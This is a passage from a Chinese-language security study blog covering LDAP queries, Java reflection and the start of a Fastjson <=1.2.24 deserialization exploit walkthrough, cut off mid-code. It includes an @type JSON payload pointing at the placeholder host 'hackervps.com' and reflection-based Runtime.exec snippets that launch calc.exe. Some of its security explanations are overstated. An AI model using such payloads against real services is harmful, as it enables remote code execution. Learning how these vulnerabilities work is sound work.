class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=john,ou=People,dc=example,dc=com</span><br></pre></td></tr></table></figure><p>这个<code>DN</code>由三个<code>RDN</code>组成：<code>uid=john</code>、<code>ou=People</code>、<code>dc=example,dc=com</code>。<br>可以使用如下<code>LDAP</code>查询语句来检索员工信息，例如：<code>(&amp;(objectClass=person)(uid=john))</code><br>这个查询语句表示查找所有<code>objectClass</code>为<code>person</code>，且<code>uid</code>为<code>john</code>的员工信息。在<code>LDAP</code>中，查询语句使用<code>LDAP</code>搜索过滤器（<code>LDAP Search Filter</code>）进行筛选。在<code>Fastjson</code>漏洞中，攻击者可以通过构造特定的<code>LDAP</code>查询语句，来执行任意代码或获取敏感信息。例如，以下<code>JSON</code>字符串包含一个恶意构造的<code>LDAP URL</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;ldap://hackervps.com/exp&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>当<code>Fastjson</code>解析该<code>JSON</code>字符串时，会触发<code>LDAP</code>查询操作，查询<code>hackervps.com</code>上的<code>LDAP</code>服务，并执行名为“<code>exp</code>”的操作。这就是<code>Fastjson</code>漏洞的成因之一。</p><h2 id="6-java反射是什么？"><a href="#6-java反射是什么？" class="headerlink" title="6. java反射是什么？"></a>6. java反射是什么？</h2><p>参考：</p><blockquote><p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">https://www.javasec.org/javase/Reflection/Reflection.html</a></p></blockquote><h3 id="（1）通过demo快速理解反射"><a href="#（1）通过demo快速理解反射" class="headerlink" title="（1）通过demo快速理解反射"></a>（1）通过demo快速理解反射</h3><p>如果我们不用反射的话，我们写的代码会是下面这样：<br><code>Person.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, my name is &quot;</span> + name + <span class="string">&quot;, I&#x27;m &quot;</span> + age + <span class="string">&quot; years old.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Main.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建Person对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Person对象的sayHello方法</span></span><br><span class="line">        person.sayHello();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改Person对象的age属性</span></span><br><span class="line">        person.setAge(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出修改后的Person对象信息</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680265498770-06d129ea-46e6-4a00-9de3-39d99e308515.png#averageHue=%23f9f8f7&clientId=ud95377f6-2eb9-4&from=paste&height=699&id=u610eab0d&name=image.png&originHeight=874&originWidth=1243&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130011&status=done&style=none&taskId=u599905ec-8599-44d8-986f-fd61a3c175e&title=&width=994.4" alt="image.png"><br>可以看到，我们一开始设置人的名字为张三，年龄为<code>20</code>，然后我们通过<code>setAge</code>方法来修改<code>Person</code>的<code>Age</code>属性，把年龄改成<code>30</code>。<br>但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到<code>Java</code>反射技术。我们可以修改上面的<code>Main.py</code>为如下内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取Person类的Class对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.example.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Person对象</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">person</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;张三&quot;</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Person对象的sayHello方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">        method.invoke(person);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改Person对象的age属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(person, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出修改后的Person对象信息</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以来动态创建对象、调用方法以及修改属性等。</p><h4 id="问题：我还是觉得你给出的例子体现不出灵活，怎么办？"><a href="#问题：我还是觉得你给出的例子体现不出灵活，怎么办？" class="headerlink" title="问题：我还是觉得你给出的例子体现不出灵活，怎么办？"></a>问题：我还是觉得你给出的例子体现不出灵活，怎么办？</h4><p>不急，我们来看这么个例子：<br>假设我们有一个配置文件，里面记录了类的名称、方法名、属性名等信息，我们可以在运行时读取配置文件，然后使用<code>Java</code>反射机制来创建对象、调用方法、修改属性等。这样就可以实现在不修改代码的情况下，根据配置文件来动态地创建对象、调用方法、修改属性，这样不就是很灵活很方便了么？我们来尝试用代码实现下。<br>先建立一个配置文件，比如叫做<code>config.properties</code>，填写如下信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class=org.example.Person</span><br><span class="line">method=sayHello</span><br><span class="line">field=age</span><br><span class="line">value=<span class="number">30</span></span><br><span class="line">name=W01fh4cker</span><br></pre></td></tr></table></figure><p>然后修改<code>Main.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 读取配置文件</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.load(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;config.properties&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类的名称、方法名、属性名、属性值、姓名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;method&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fieldName</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;field&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fieldValue</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类的Class对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类的有参构造方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类的对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(name, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(methodName);</span><br><span class="line">        method.invoke(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, Integer.parseInt(fieldValue));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出修改后的对象信息</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276045777-f76ed6d9-b4d6-4e9d-839c-30f5ecfdd0be.png#averageHue=%23f9f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u5a11505a&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=209693&status=done&style=none&taskId=uf3c6207e-0ec8-46c8-8ada-0ce738578e6&title=&width=1536" alt="image.png"></p><h3 id="（2）【关键！】和漏洞之间的联系？"><a href="#（2）【关键！】和漏洞之间的联系？" class="headerlink" title="（2）【关键！】和漏洞之间的联系？"></a>（2）【关键！】和漏洞之间的联系？</h3><p>前面讲了这么多关于反射的内容，可能很多初学者和我现在一样，处于一脸懵逼的状态，为什么要用到反射，而不是直接调用<code>java.lang.runtime</code>来执行命令？<br>例如我们平时经常这么玩：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>).getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要运行上述代码，需要在maven中引入如下依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.11</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是，要在上述依赖的上线加入<code>&lt;dependencies&gt;&lt;/dependencies&gt;</code>，如下图，然后点击如下图标来自动安装依赖：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276780188-ce707c15-4872-44bc-8f69-9aa3abb27ca5.png#averageHue=%23fbfafa&clientId=ud95377f6-2eb9-4&from=paste&height=481&id=ud3f79683&name=image.png&originHeight=601&originWidth=1386&originalType=binary&ratio=1.25&rotation=0&showTitle=true&size=66917&status=done&style=none&taskId=uc1835653-ba55-436a-9f60-4f526b665c7&title=%E6%AD%A4%E5%9B%BE%E6%98%AF%E5%90%8E%E6%9D%A5%E8%A1%A5%E7%9A%84%EF%BC%8C%E6%80%95%E8%90%8C%E6%96%B0%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%85maven%E4%BE%9D%E8%B5%96&width=1108.8" alt="image.png" title="此图是后来补的，怕萌新不知道怎么快速安装maven依赖"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276729720-36a6756c-9064-4b40-94bf-6308bd29e040.png#averageHue=%23f9f9f8&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7768c829&name=a4218697fec3a30e3ce077ccb178fbe.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=true&size=127735&status=done&style=none&taskId=u83af4e91-9633-4d94-a87f-67085301d4f&title=%E5%B7%A6%E4%B8%8B%E6%96%B9%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%AD%A3%E5%9C%A8%E4%B8%8B%E8%BD%BD%E4%BE%9D%E8%B5%96&width=1536" alt="a4218697fec3a30e3ce077ccb178fbe.png" title="左下方可以看到正在下载依赖"><br>然后运行程序，就会弹出计算器了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276862711-f45e3255-7f60-419f-b05f-f14e7bfa2872.png#averageHue=%23f7f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u0b8d64f7&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179612&status=done&style=none&taskId=u634c0f95-8cd8-447f-aeef-7678439b0ee&title=&width=1536" alt="image.png"><br>这么做不就是可以执行命令了吗，为什么还要搞反射呢？<br><strong>原来，</strong><code>**Java**</code><strong>安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取</strong><code>**Java**</code><strong>的安全权限。获取</strong><code>**Java**</code><strong>的安全权限需要经过一系列的安全检查，例如检查代码的来源、检查代码的签名等。如果代码没有通过这些安全检查，就无法获取</strong><code>**Java**</code><strong>的安全权限，从而无法执行危险的操作。然而，反射机制可以绕过</strong><code>**Java**</code><strong>安全机制的限制，比如可以访问和修改类的私有属性和方法，可以调用类的私有构造方法，可以创建和访问动态代理对象等。这些操作都是</strong><code>**Java**</code><strong>安全机制所禁止的，但是反射机制可以绕过这些限制，从而执行危险的操作。</strong><br>原来如此！好了，现在来学习如何使用反射调用<code>java.lang.runtime</code>来执行命令，由于Java9之后，模块化系统被引入，模块化系统会限制反射的使用，从而提高<code>Java</code>应用程序的安全性，因此我们要区分版本来学习！为了方便演示，我重新建立了一个项目，并使用<code>Java8</code>。<br>我们先看如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java version: 8</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) execMethod.invoke(Runtime.getRuntime(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功执行：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680277763641-372fcf97-9671-4916-9063-71b32b4ca4dc.png#averageHue=%23f7f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7229a943&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193286&status=done&style=none&taskId=u27a74f91-68b8-4ccd-a609-52611a84a9b&title=&width=1536" alt="image.png"><br>然后再看在<code>Java17</code>下的执行反射的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// // Java version: 17</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodHandle;</span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodHandles;</span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">        Class&lt;?&gt; runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">MethodHandle</span> <span class="variable">execMethod</span> <span class="operator">=</span> MethodHandles.lookup().findVirtual(runtimeClass, <span class="string">&quot;exec&quot;</span>, MethodType.methodType(Process.class, String.class));</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) execMethod.invokeExact(Runtime.getRuntime(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680278080283-7812f55e-015f-47a2-a195-72427beac360.png#averageHue=%23f7f6f4&clientId=ud95377f6-2eb9-4&from=paste&height=819&id=u67b7cb21&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210532&status=done&style=none&taskId=u48718344-5315-40b3-8edc-a6d96955e58&title=&width=1536" alt="image.png"></p><h1 id="二、漏洞学习"><a href="#二、漏洞学习" class="headerlink" title="二、漏洞学习"></a>二、漏洞学习</h1><h2 id="1-fastjson"><a href="#1-fastjson" class="headerlink" title="1. fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）"></a>1. fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）</h2><h3 id="（1）漏洞简单复现"><a href="#（1）漏洞简单复现" class="headerlink" title="（1）漏洞简单复现"></a>（1）漏洞简单复现</h3><p>我们看以下案例：<br>首先创建一个<code>maven</code>项目、导入<code>Fastjson1.2.23</code>并自动下载相关依赖（怎么自动下载的见上文配图）：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680362559966-b2204359-9c98-40ab-bbe4-2a4edda1caaf.png#averageHue=%23f9f8f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7bb5dc5f&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145481&status=done&style=none&taskId=ub1d23e6a-5fd8-483e-8b6f-fc3fc32970d&title=&width=1536" alt="image.png"><br>然后写入如下代码至<code>Main.java</code>（此时已经不需要<code>Person.java</code>了）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span 